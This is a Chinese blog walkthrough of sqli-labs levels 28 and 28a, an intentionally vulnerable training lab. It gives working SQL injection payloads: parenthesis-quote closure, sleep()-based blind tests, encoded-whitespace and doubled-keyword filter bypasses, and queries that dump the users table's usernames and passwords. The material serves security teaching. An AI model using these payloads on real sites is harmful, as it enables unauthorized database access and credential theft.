# 原创
：  （手工）【sqli-labs28、28a】字符型注入、盲注、过滤

# （手工）【sqli-labs28、28a】字符型注入、盲注、过滤

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less28（GET-Blind based - All your UNION &amp; SELECT belong to us  -string single quote with Parenthesis）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（过滤-盲注-字符型注入）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 2.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[2.4、第三步：判断字段数](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.5、第四步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[2.6、第五步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[2.7、第六步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[2.8、第七步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[三、Less28a（GET-Blind based - All your UNION &amp; SELECT belong to us  -single quote -Parenthesis ）](#%E4%BA%8C%E3%80%81Less25a%EF%BC%88GET-Blind%20based%20-%20All%20your%20OR%20%26%20AND%20belong%20to%20us-Intiger%20based%C2%A0%EF%BC%89)

[3.1、简介：（过滤-盲注-字符型注入）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88Cookie%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%89)

[3.2、特点：](#3.2%E3%80%81%E7%89%B9%E7%82%B9%EF%BC%9A)

---


> 
<h2>推荐：</h2>
[【SQL注入-无回显】时间盲注：原理、函数、利用过程<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165776808616780366570315%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165776808616780366570315&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165776808616780366570315%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165776808616780366570315&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)
[【SQL注入-无回显】布尔盲注：原理、函数、利用过程https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165770191616781818723356%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165770191616781818723356&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E5%B8%83%E5%B0%94&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165770191616781818723356%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165770191616781818723356&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E5%B8%83%E5%B0%94&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165770191616781818723356%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165770191616781818723356&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E5%B8%83%E5%B0%94&amp;spm=1018.2226.3001.4450)
[【SQL注入】数字型注入 &amp; 字符型注入https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501)
[【WAF绕过】SQL注入、文件上传、XSShttps://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450)


---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限
第三步：判断字段数
第四步：爆数据库名
第五步：爆表名
第六步：爆字段名
第七步：爆数据


---


---


## 二、Less28（GET-Blind based - All your UNION &amp; SELECT belong to us  -string single quote with Parenthesis）

> 
<h3>2.1、简介：（过滤-盲注-字符型注入）</h3>
请求方法：GET
方法：过滤+闭合（字符型注入）+盲注


> 
<h3>2.2、第一步：注入点测试</h3>
输入?id=1 
 后面加上单引号发现报错了
说明是单引号闭合，即是字符型注入
且可利用报错回显

用2个单引号前后闭合后
显示正常

 测试注入语句是否正常
?id=1'%26%26sleep(3)%26%26'1
发现浏览器一直转，而不是转3s
并最终报错


猜测是不是有括号未闭合（或获取源码）
?id=1')%26%26sleep(3)%26%26('1
转3s，且显示正常
语句被顺利执行




> 
<h3> 2.3、第二步：分析过滤</h3>
方法一：
考虑一步一步将注入语句字符一个一个替换掉，直到不报错（浪费时间）
或者全部替换（如果报错，不知道哪里被过滤了）
<hr/>
方法二：
获取源码进行白盒审计（最优）
<hr/>方法三： 
 eg：输入?id=and or union select --+ updatexml # extractvalue（重要的都输进去）
看输入回显过滤语句的情况



<hr/>
通过一顿操作后
最后可以知道被过滤的字符有
 – , # , 空格 , /，+
union（大小写都过滤）、select（大小写都过滤）
<hr/>
替代空格：
%09  TAB 键（水平）
%0a  新建一行
%0c  新的一页
%0d  return 功能
%0b  TAB 键（垂直）
%a0  空格
空格换成 ||
<hr/>
注释被过滤掉了，就可以使用拼接进语句，将2侧进行闭合
<hr/>
union和select可以使用双写


---


---


---


> 
<h3>2.4、第三步：判断字段数</h3>
?id=0')union(select%0d1,2,'3




> 
<h3>2.5、第四步：暴库</h3>
?id=1')%26%26extractvalue(1, concat(0x7e, database()))%26%26('1


?id=0')unIon%0BSelEcT%0B1,database(),3||('1

报错提示：期望我的这个id=1是资源
考虑变换注入语句格式，或者使用时间盲注
<hr/>

 时间盲注：
?id=1')%26%26if(database()='security', sleep(3), 1)%26%26('1<img alt="" height="951" src="https://img-blog.csdnimg.cn/f9c40b13b51c47448ea57180fe6e806b.png" width="1200"/>



> 
<h3>2.6、第五步：爆表名</h3>
 ?id=0')uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'and ('1





> 
<h3>2.7、第六步：爆字段</h3>
?id=0')uni union%0Aselecton%0Aselect%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema='security'%0Aand%0Atable_name='users'%0Aand('1






> 
<h3>2.8、第七步：爆数据</h3>
?id=0')union(select%0d1,(select(group_concat(username,password))from(users)),'3




---


---


## 三、Less28a（GET-Blind based - All your UNION &amp; SELECT belong to us  -single quote -Parenthesis ）

> 
<h3>3.1、简介：（过滤-盲注-字符型注入）</h3>
请求方法：GET
方法：过滤+闭合（字符型注入）+盲注


> 
<h3>3.2、特点：</h3>
')字符型注入
过滤了union、select、注释、斜杠
还比第28少了空格等

